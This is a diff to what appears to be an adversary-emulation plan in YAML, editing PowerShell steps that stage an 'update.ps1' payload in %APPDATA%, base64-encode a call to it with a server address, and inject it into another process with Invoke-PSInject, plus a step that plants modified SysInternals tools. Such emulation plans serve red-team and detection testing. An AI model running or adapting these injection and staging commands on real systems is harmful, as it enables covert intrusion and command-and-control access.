@@ -433,7 +433,7 @@
           Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
           Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
           $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
-          Inject -PoshCode $pcode;
+          Start-Job -ScriptBlock { param($code); Import-Module .\Invoke-PSInject.ps1; Inject -PoshCode $code } -ArgumentList $pcode;
         payloads:
         - update.ps1
         - Invoke-PSInject.ps1
@@ -442,7 +442,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 10.0.17.3
+      default: 192.168.1.45 
 
   executors:
   - name: powershell
@@ -450,7 +450,7 @@
       Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
       Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
       $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
-      Inject -PoshCode $pcode;
+      Start-Job -ScriptBlock { param($code); Import-Module .\Invoke-PSInject.ps1; Inject -PoshCode $code } -ArgumentList $pcode;
 
 # Step 4 - Defense Evasion and Discovery
 
@@ -518,7 +518,7 @@
           } else {
             write-host "[!] Error downloading and planting modified system tools."
           }
-
+        timeout: 600
         payloads:
         - Modified-SysInternalsSuite.zip
 
